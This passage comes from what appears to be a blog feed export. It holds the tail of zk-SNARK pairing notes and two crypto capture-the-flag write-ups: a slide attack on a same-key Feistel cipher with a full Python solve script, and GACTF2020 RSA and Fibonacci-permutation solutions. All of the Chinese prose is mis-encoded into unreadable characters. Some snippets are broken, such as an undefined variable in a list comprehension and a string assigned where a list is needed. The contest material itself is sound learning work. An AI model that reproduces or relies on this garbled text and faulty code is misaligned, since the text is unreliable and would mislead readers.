title="å®é™…æ–¹æ¡ˆ"></a>å®é™…æ–¹æ¡ˆ</h4><p>ä¸Šè¿°æ‰€ä½¿ç”¨çš„åŒæ€åŠ æ³•è¿ç®—Eåœ¨æ¤­åœ†æ›²çº¿ä¸Šï¼Œå› æ­¤æ— æ³•å®ç°é«˜æ•ˆçš„$E^{-1}$ï¼Œè€ƒè™‘å¼•å…¥åŒçº¿æ€§å¯¹</p><blockquote><p>$G_1,G_2,G_T$ä¸ºné˜¶ä¹˜æ³•å¾ªç¯ç¾¤ï¼ˆæ¤­åœ†æ›²çº¿ä¸ŠåŠ æ³•ï¼‰ï¼Œä¸€ä¸ªåŒçº¿æ€§å¯¹eå°±æ˜¯ä¸€ä¸ªä»$G_1\times G_2$åˆ°$G_T$çš„åŒçº¿æ€§æ˜ å°„</p><p>å…¶ä¸­æ»¡è¶³çš„æœ€é‡è¦ä¸€æ¡æ€§è´¨å³ä¸ºåŒçº¿æ€§æ€§ï¼š</p><p>$g_1\in G_1,g_2\in G_2,e(g_1^a,g_2^b)=e(g_1,g_2)^{ab}$.</p></blockquote><p>(æ¤­åœ†æ›²çº¿) å‡è®¾$G_1$ä¸Šçš„åŠ æ³•åŒæ€è¿ç®—å®šä¹‰ä¸º$E_1$(åŸºç‚¹*x), $G_2$ä¸Šçš„åŠ æ³•åŒæ€å®šä¹‰ä½œ$E_2$ï¼Œåˆ™</p><p>$e(E_1(x),E_2(y))=e(E_1(u),E_2(v)),xy=uv$.</p><p>é€šè¿‡åŒçº¿æ€§å¯¹ï¼Œå½“t = xy = uvæ—¶ï¼Œ</p><p>$E(t)=e(E_1(x),E_2(y))=e(E_1(u),E_2(v))$</p><p>ä¸”$E(ax+by)=e(E_1(ax+by),E_2(1))=e(aE_1(x)+bE_1(y),E_2(1))=aE(x)+bE(y)$ï¼Œæ»¡è¶³åŠ æ³•åŒæ€</p><p>å› æ­¤å¯é‡‡ç”¨å…±åŒå‚è€ƒæ•°æ®é›†ï¼ˆCRSï¼‰å®ç°ä»¥ä¸‹zk-SHARKSæµç¨‹ï¼š</p><p><img src= "/img/loading.gif" data-src="/2020/10/26/Learning-of-NIZK/EvIdr9wHxL6UQAP.png" alt></p><p>1) $e(E_1(A(t)),E_2(\alpha_{a}))?=e(E_1(\alpha_{a}A(t)),E_2(1))$ï¼Œæ ¡éªŒAliceä¼ å›çš„$E_1(A(t))$æ˜¯å¦ä¸º$E_1(A_{i}(t))$çš„çº¿æ€§ç»„åˆ</p><p>2) $e(E_1(\alpha_{b}),E_2(B(t)))?=e(E_1(1),E_2(\alpha_{b}B(t)))$ï¼Œæ ¡éªŒAliceä¼ å›çš„$E_2(B(t))$æ˜¯å¦ä¸º$E_2(B_{i}(t))$çš„çº¿æ€§ç»„åˆ</p><p>3) $e(E_1(C(t)),E_2(\alpha_{c}))?=e(E_1(\alpha_{c}C(t)),E_2(1))$ï¼Œæ ¡éªŒAliceä¼ å›çš„$E_1(C(t))$æ˜¯å¦ä¸º$E_1(C_{i}(t))$çš„çº¿æ€§ç»„åˆ</p><p>4) $e(E_1(Î²L(t)),E_2(1))?=E(\beta(A(t)+B(t)+C(t)))=e(E_1(A(t))+E_1(C(t)),E_2(\beta))+e(E_1(\beta),E_2(B(t)))$ï¼Œæ ¡éªŒA,B,Cä¸­ä½¿ç”¨çš„ä¸ºåŒä¸€ä¸ªè§£å‘é‡s</p><p>5) $e(E_1(A(t)),E_2(B(t)))?=e(E_1(H(t)),E_2(Z(t)))+e(E_1(C(t)),E_2(1))$ï¼Œæ ¡éªŒå‘é‡sæ­£ç¡®æ€§</p><h3 id="zcashæ„å»ºzk-SNARKS"><a href="#zcashæ„å»ºzk-SNARKS" class="headerlink" title="zcashæ„å»ºzk-SNARKS"></a>zcashæ„å»ºzk-SNARKS</h3><p><a href="https://m.mytokencap.com/news/116994" target="_blank" rel="noopener">https://m.mytokencap.com/news/116994</a></p><p>åˆ©ç”¨ libsnark åº“å¼€å‘ zk-SNARKs</p><p><a href="https://zhuanlan.zhihu.com/p/100809637" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/100809637</a></p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é‡‘èå¯†ç æ¯2020-æŒ‘æˆ˜èµ›</title>
      <link href="/2020/09/22/%E9%87%91%E8%9E%8D%E5%AF%86%E7%A0%81%E6%9D%AF2020-%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/2020/09/22/%E9%87%91%E8%9E%8D%E5%AF%86%E7%A0%81%E6%9D%AF2020-%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h3 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h3><p>slå’Œcoinå¸¦æˆ‘èººäº†ojzzzzï¼Œè¿™é‡Œä»…ä½œdec-01çš„è®°å½•ï¼Œå…¶ä»–é¢˜ç›®å…¨æ˜¯SMå›½å¯†ç³»åˆ—</p><h3 id="dec-01"><a href="#dec-01" class="headerlink" title="dec - 01"></a>dec - 01</h3><h4 id="é¢˜ç›®æ–‡ä»¶"><a href="#é¢˜ç›®æ–‡ä»¶" class="headerlink" title="[é¢˜ç›®æ–‡ä»¶]"></a>[é¢˜ç›®æ–‡ä»¶]</h4><p><a href="release.zip">Click Here to Download</a></p><h4 id="é¢˜è§£åˆ†æ"><a href="#é¢˜è§£åˆ†æ" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>111111 roundçš„feistelï¼Œä½†æ¯è½®ä½¿ç”¨çš„è½®å¯†é’¥å‡ç›¸åŒï¼ˆæ€ç»´å›ºåŒ–ä¸€ç›´ä»¥ä¸ºæ˜¯å·®åˆ†ä¸€ç›´å¡ç€ï¼Œ111111è½®æƒ³ğŸ‘</p><p>ä¸”ç»™å‡ºçš„æ˜å¯†æ–‡å¯¹ä¸­ï¼Œç»™å‡ºçš„å‰65536ç»„ptå‰å››ä¸ªå­—èŠ‚fixed(â€˜aaaaâ€™)ï¼Œå65526ç»„ptåå››ä¸ªå­—èŠ‚fixed(â€˜aaaaâ€™)</p><p>å¯»æ‰¾ç¢°æ’ï¼Œæ‰¾åˆ°æ»¡è¶³ä»¥ä¸‹æ¡ä»¶çš„æ˜å¯†æ–‡å¯¹ï¼š</p><p>å½“suffix-fixedçš„ptåœ¨ç¬¬ä¸€è½®åŠ å¯†åçš„è¾“å‡ºï¼Œæ°å¥½ç­‰äºprefix-fixedçš„ptçš„ç¬¬ä¸€è½®è¾“å…¥æ—¶ï¼Œ</p><p>suffix-fixedçš„ctçš„å·¦éƒ¨ç­‰äºprefix-fixedçš„ctçš„å³éƒ¨</p><p><img src= "/img/loading.gif" data-src="/2020/09/22/%E9%87%91%E8%9E%8D%E5%AF%86%E7%A0%81%E6%9D%AF2020-%E6%8C%91%E6%88%98%E8%B5%9B/CRYPTO_DRAW.png" alt></p><p>æ‰¾åˆ°ç¢°æ’åï¼Œåˆ†åˆ«è·å¾—å®Œæ•´ç¬¬ä¸€è½®åŠæœ€åä¸€è½®çš„è¾“å…¥è¾“å‡ºï¼Œæ ¡éªŒäºŒè€…æ±‚å‡ºçš„keyæ˜¯å¦ç›¸åŒå³å¯</p><p>å½“ç›¸åŒæ—¶å³è·å¾—æ­£ç¡®flagï¼Œå¯¹cipherè§£å¯†å¾—åˆ°flag{beginning_of_cryptanalysis_series_excited}</p><p>ç¢°æ’æ¦‚ç‡ä¼°è®¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>((<span class="number">2</span>**<span class="number">32</span><span class="number">-2</span>**<span class="number">16</span>)/(<span class="number">2</span>**<span class="number">32</span>))**<span class="number">65536</span></span><br><span class="line"><span class="number">0.36787663445620106</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‰¾åˆ°ä¸€å¯¹ç¢°æ’çš„æ¦‚ç‡çº¦ä¸º0.64ï¼Œæœ¬é¢˜ä¸­æ°èƒ½æ‰¾åˆ°ä¸€å¯¹</p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line">Sbox = [<span class="number">0x63</span>, <span class="number">0x7c</span>, <span class="number">0x77</span>, <span class="number">0x7b</span>, <span class="number">0xf2</span>, <span class="number">0x6b</span>, <span class="number">0x6f</span>, <span class="number">0xc5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2b</span>, <span class="number">0xfe</span>, <span class="number">0xd7</span>, <span class="number">0xab</span>, <span class="number">0x76</span>, <span class="number">0xca</span>, <span class="number">0x82</span>, <span class="number">0xc9</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xf0</span>, <span class="number">0xad</span>, <span class="number">0xd4</span>, <span class="number">0xa2</span>, <span class="number">0xaf</span>, <span class="number">0x9c</span>, <span class="number">0xa4</span>, <span class="number">0x72</span>, <span class="number">0xc0</span>, <span class="number">0xb7</span>, <span class="number">0xfd</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3f</span>, <span class="number">0xf7</span>, <span class="number">0xcc</span>, <span class="number">0x34</span>, <span class="number">0xa5</span>, <span class="number">0xe5</span>, <span class="number">0xf1</span>, <span class="number">0x71</span>, <span class="number">0xd8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0xc7</span>, <span class="number">0x23</span>, <span class="number">0xc3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9a</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xe2</span>, <span class="number">0xeb</span>, <span class="number">0x27</span>, <span class="number">0xb2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2c</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x6e</span>, <span class="number">0x5a</span>, <span class="number">0xa0</span>, <span class="number">0x52</span>, <span class="number">0x3b</span>, <span class="number">0xd6</span>, <span class="number">0xb3</span>, <span class="number">0x29</span>, <span class="number">0xe3</span>, <span class="number">0x2f</span>, <span class="number">0x84</span>, <span class="number">0x53</span>, <span class="number">0xd1</span>, <span class="number">0x00</span>, <span class="number">0xed</span>, <span class="number">0x20</span>, <span class="number">0xfc</span>, <span class="number">0xb1</span>, <span class="number">0x5b</span>, <span class="number">0x6a</span>, <span class="number">0xcb</span>, <span class="number">0xbe</span>, <span class="number">0x39</span>, <span class="number">0x4a</span>, <span class="number">0x4c</span>, <span class="number">0x58</span>, <span class="number">0xcf</span>, <span class="number">0xd0</span>, <span class="number">0xef</span>, <span class="number">0xaa</span>, <span class="number">0xfb</span>, <span class="number">0x43</span>, <span class="number">0x4d</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xf9</span>, <span class="number">0x02</span>, <span class="number">0x7f</span>, <span class="number">0x50</span>, <span class="number">0x3c</span>, <span class="number">0x9f</span>, <span class="number">0xa8</span>, <span class="number">0x51</span>, <span class="number">0xa3</span>, <span class="number">0x40</span>, <span class="number">0x8f</span>, <span class="number">0x92</span>, <span class="number">0x9d</span>, <span class="number">0x38</span>, <span class="number">0xf5</span>, <span class="number">0xbc</span>, <span class="number">0xb6</span>, <span class="number">0xda</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xff</span>, <span class="number">0xf3</span>, <span class="number">0xd2</span>, <span class="number">0xcd</span>, <span class="number">0x0c</span>, <span class="number">0x13</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xc4</span>, <span class="number">0xa7</span>, <span class="number">0x7e</span>, <span class="number">0x3d</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4f</span>, <span class="number">0xdc</span>, <span class="number">0x22</span>, <span class="number">0x2a</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xee</span>, <span class="number">0xb8</span>, <span class="number">0x14</span>, <span class="number">0xde</span>, <span class="number">0x5e</span>, <span class="number">0x0b</span>, <span class="number">0xdb</span>, <span class="number">0xe0</span>, <span class="number">0x32</span>, <span class="number">0x3a</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>, <span class="number">0xc2</span>, <span class="number">0xd3</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xe4</span>, <span class="number">0x79</span>, <span class="number">0xe7</span>, <span class="number">0xc8</span>, <span class="number">0x37</span>, <span class="number">0x6d</span>, <span class="number">0x8d</span>, <span class="number">0xd5</span>, <span class="number">0x4e</span>, <span class="number">0xa9</span>, <span class="number">0x6c</span>, <span class="number">0x56</span>, <span class="number">0xf4</span>, <span class="number">0xea</span>, <span class="number">0x65</span>, <span class="number">0x7a</span>, <span class="number">0xae</span>, <span class="number">0x08</span>, <span class="number">0xba</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2e</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0xc6</span>, <span class="number">0xe8</span>, <span class="number">0xdd</span>, <span class="number">0x74</span>, <span class="number">0x1f</span>, <span class="number">0x4b</span>, <span class="number">0xbd</span>, <span class="number">0x8b</span>, <span class="number">0x8a</span>, <span class="number">0x70</span>, <span class="number">0x3e</span>, <span class="number">0xb5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xf6</span>, <span class="number">0x0e</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xb9</span>, <span class="number">0x86</span>, <span class="number">0xc1</span>, <span class="number">0x1d</span>, <span class="number">0x9e</span>, <span class="number">0xe1</span>, <span class="number">0xf8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xd9</span>, <span class="number">0x8e</span>, <span class="number">0x94</span>, <span class="number">0x9b</span>, <span class="number">0x1e</span>, <span class="number">0x87</span>, <span class="number">0xe9</span>, <span class="number">0xce</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xdf</span>, <span class="number">0x8c</span>, <span class="number">0xa1</span>, <span class="number">0x89</span>, <span class="number">0x0d</span>, <span class="number">0xbf</span>, <span class="number">0xe6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2d</span>, <span class="number">0x0f</span>, <span class="number">0xb0</span>, <span class="number">0x54</span>, <span class="number">0xbb</span>, <span class="number">0x16</span>]</span><br><span class="line">inv_Sbox = [Sbox.index(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'ciphertext'</span>, <span class="string">'r'</span>)</span><br><span class="line">cipher = unhexlify(f.readline().strip())</span><br><span class="line">prefix_a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">    _ = f.readline().strip().split(<span class="string">' '</span>)</span><br><span class="line">    prefix_a.append((_[<span class="number">0</span>], _[<span class="number">1</span>]))</span><br><span class="line">suffix_a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">    _ = f.readline().strip().split(<span class="string">' '</span>)</span><br><span class="line">    suffix_a.append((_[<span class="number">0</span>], _[<span class="number">1</span>]))</span><br><span class="line">prefix_a_ct_right, suffix_a_ct_left = set(), set()</span><br><span class="line">prefix_a_ct_back, suffix_a_ct_back = dict(), dict()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">    prefix_a_ct_right.add(prefix_a[i][<span class="number">1</span>][<span class="number">8</span>:])</span><br><span class="line">    prefix_a_ct_back[prefix_a[i][<span class="number">1</span>][<span class="number">8</span>:]] = i</span><br><span class="line">    suffix_a_ct_left.add(suffix_a[i][<span class="number">1</span>][:<span class="number">8</span>])</span><br><span class="line">    suffix_a_ct_back[suffix_a[i][<span class="number">1</span>][:<span class="number">8</span>]] = i</span><br><span class="line">crash = prefix_a_ct_right &amp; suffix_a_ct_left</span><br><span class="line">pairs = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> crash:</span><br><span class="line">    i, j = prefix_a_ct_back[_], suffix_a_ct_back[_]</span><br><span class="line">    pairs.append((prefix_a[i], suffix_a[j]))</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> pairs:</span><br><span class="line">    print(_)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(x, k)</span>:</span></span><br><span class="line">    tmp = list(xor(x, k))</span><br><span class="line">    tmp = [Sbox[_] <span class="keyword">for</span> _ <span class="keyword">in</span> tmp]</span><br><span class="line">    _ = tmp[<span class="number">1</span>:] + [<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        tmp[i] = (tmp[i] + _[i]) % <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">return</span> bytes(tmp)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_func</span><span class="params">(x, k)</span>:</span></span><br><span class="line">    tmp = list(x)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        tmp[i] = (tmp[i] - tmp[i+<span class="number">1</span>]) % <span class="number">0x100</span></span><br><span class="line">    tmp = [inv_Sbox[_] <span class="keyword">for</span> _ <span class="keyword">in</span> tmp]</span><br><span class="line">    <span class="keyword">return</span> xor(bytes(tmp), k)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key</span><span class="params">(pair)</span>:</span></span><br><span class="line">    x = xor(unhexlify(pair[<span class="number">0</span>][<span class="number">0</span>][<span class="number">8</span>:]), unhexlify(pair[<span class="number">1</span>][<span class="number">0</span>][:<span class="number">8</span>]))</span><br><span class="line">    tmp = list(x)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        tmp[i] = (tmp[i] - tmp[i + <span class="number">1</span>]) % <span class="number">0x100</span></span><br><span class="line">    tmp = [inv_Sbox[_] <span class="keyword">for</span> _ <span class="keyword">in</span> tmp]</span><br><span class="line">    key1 = xor(bytes(tmp), unhexlify(pair[<span class="number">1</span>][<span class="number">0</span>][<span class="number">8</span>:]))</span><br><span class="line">    x = xor(unhexlify(pair[<span class="number">1</span>][<span class="number">1</span>][<span class="number">8</span>:]), unhexlify(pair[<span class="number">0</span>][<span class="number">1</span>][:<span class="number">8</span>]))</span><br><span class="line">    tmp = list(x)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        tmp[i] = (tmp[i] - tmp[i + <span class="number">1</span>]) % <span class="number">0x100</span></span><br><span class="line">    tmp = [inv_Sbox[_] <span class="keyword">for</span> _ <span class="keyword">in</span> tmp]</span><br><span class="line">    key2 = xor(bytes(tmp), unhexlify(pair[<span class="number">0</span>][<span class="number">1</span>][<span class="number">8</span>:]))</span><br><span class="line">    <span class="keyword">if</span> key1 == key2:</span><br><span class="line">        <span class="keyword">return</span> key1</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pair <span class="keyword">in</span> pairs:</span><br><span class="line">    k = crack_key(pair)</span><br><span class="line">    <span class="keyword">if</span> k:</span><br><span class="line">        key = k</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec_block</span><span class="params">(x, k)</span>:</span></span><br><span class="line">    l, r = x[:<span class="number">4</span>], x[<span class="number">4</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">111111</span>):</span><br><span class="line">        l, r = r, xor(l, func(r, k))</span><br><span class="line">    l, r = r, l</span><br><span class="line">    <span class="keyword">return</span> (l + r)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(x, k)</span>:</span></span><br><span class="line">    pt = <span class="string">b''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(x), <span class="number">8</span>):</span><br><span class="line">        pt += dec_block(x[i:i+<span class="number">8</span>], k)</span><br><span class="line">    <span class="keyword">return</span> pt</span><br><span class="line"></span><br><span class="line">print(dec(cipher, key))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">(('61616161c5039c68', 'ac74c268a9084661'), ('29d6d89e61616161', 'a9084661a403759e'))</span></span><br><span class="line"><span class="string">(('61616161cb9d3d82', 'e2c22abd8cf47ca5'), ('9397d96461616161', '8cf47ca5cb8de97a'))</span></span><br><span class="line"><span class="string">(('616161614e9c397d', 'a9a59268a5a34a22'), ('de59099b61616161', 'a5a34a22c8c8d126'))</span></span><br><span class="line"><span class="string">(('616161612ca7387d', '69b59568e8cf6822'), ('7f62089b61616161', 'e8cf6822ed24df26'))</span></span><br><span class="line"><span class="string">(('616161613f847d04', 'a9eae19288dcb189'), ('4e6a4de261616161', '88dcb1891503e936'))</span></span><br><span class="line"><span class="string">b'Nb=\x94'</span></span><br><span class="line"><span class="string">b'flag&#123;beginning_of_cryptanalysis_series_excited&#125;\x01'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h4 id="Link"><a href="#Link" class="headerlink" title="[Link]"></a>[Link]</h4><p><a href="http://theamazingking.com/crypto-slide.php" target="_blank" rel="noopener">http://theamazingking.com/crypto-slide.php</a></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(GACTF2020) - Crypto</title>
      <link href="/2020/08/30/WriteUp-GACTF2020-Crypto/"/>
      <url>/2020/08/30/WriteUp-GACTF2020-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="da-Vinci-after-rsa"><a href="#da-Vinci-after-rsa" class="headerlink" title="da Vinci after rsa"></a>da Vinci after rsa</h3><h4 id="é¢˜è§£åˆ†æ"><a href="#é¢˜è§£åˆ†æ" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">factor(<span class="number">0x1d42aea2879f2e44dea5a13ae3465277b06749ce9059fd8b7b4b560cd861f99144d0775ffffffffffff</span>)</span><br><span class="line"><span class="comment"># 9749 * 11237753507624591 * 9127680453986244150392840833873266696712898279308227257525736684312919750469261</span></span><br></pre></td></tr></table></figure><p>e=5ï¼Œå–æœ€å¤§çš„ç´ å› å­pï¼Œå‘ç°e|(p-1)ï¼ŒAMMæ•´å‡º<code>b&#39;flag{weadfa9987_adwd23123_454f}&#39;</code></p><p>ç„¶åå‡ºäº†ä¸ªå¤å…¸çš„è¾¾èŠ¬å¥‡å¯†ç å¯è¿˜è¡Œâ€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fb = [<span class="string">'1'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'5'</span>, <span class="string">'8'</span>, <span class="string">'13'</span>, <span class="string">'21'</span>, <span class="string">'34'</span>, <span class="string">'55'</span>, <span class="string">'89'</span>, <span class="string">'144'</span>, <span class="string">'233'</span>, <span class="string">'377'</span>, <span class="string">'610'</span>, <span class="string">'987'</span>, <span class="string">'1597'</span>, <span class="string">'2584'</span>, <span class="string">'4181'</span>, <span class="string">'6765'</span>, <span class="string">'10946'</span>, <span class="string">'17711'</span>, <span class="string">'28657'</span>, <span class="string">'46368'</span>, <span class="string">'75025'</span>, <span class="string">'121393'</span>, <span class="string">'196418'</span>, <span class="string">'317811'</span>, <span class="string">'514229'</span>, <span class="string">'832040'</span>, <span class="string">'1346269'</span>, <span class="string">'2178309'</span>]</span><br><span class="line">fb = [int(i) <span class="keyword">for</span> i <span class="keyword">in</span> _]</span><br><span class="line">t = [<span class="number">1</span>,<span class="number">28657</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">17711</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">46368</span>,<span class="number">75025</span>,<span class="number">34</span>,<span class="number">55</span>,<span class="number">89</span>,<span class="number">610</span>,<span class="number">377</span>,<span class="number">144</span>,<span class="number">233</span>,<span class="number">1597</span>,<span class="number">2584</span>,<span class="number">4181</span>,<span class="number">6765</span>,<span class="number">10946</span>,<span class="number">987</span>]</span><br><span class="line">m = <span class="string">'weadfa9987_adwd23123_454f'</span></span><br><span class="line">s = <span class="string">'?'</span> * <span class="number">25</span></span><br><span class="line">s = <span class="string">'list(s)'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">25</span>):</span><br><span class="line">    <span class="comment"># s[fb.index(t[i])] = m[i]</span></span><br><span class="line">    s[i] = m[fb.index(t[i])]</span><br><span class="line">print(<span class="string">''</span>.join(s))</span><br><span class="line"><span class="comment"># w5awd4fa994f87_dwad3123_2</span></span><br></pre></td></tr></table></figure><p>ç”±äºæ–æ³¢é‚£å¥‘å‰ä¸¤ä¸ªå‡ä¸º1ï¼Œä¸”t[0]=t[3]=1ï¼Œå› æ­¤å°†s[3]æ›¿æ¢ä¸ºm[1]ï¼Œå¾—åˆ°flag{w5aed4fa994f87_dwad3123_2}</p><h3 id="elgaml-rsa"><a href="#elgaml-rsa" class="headerlink" title="elgaml_rsa"></a>elgaml_rsa</h3><h4 id="é¢˜è§£åˆ†æ-1"><a href="#é¢˜è§£åˆ†æ-1" class="headerlink" 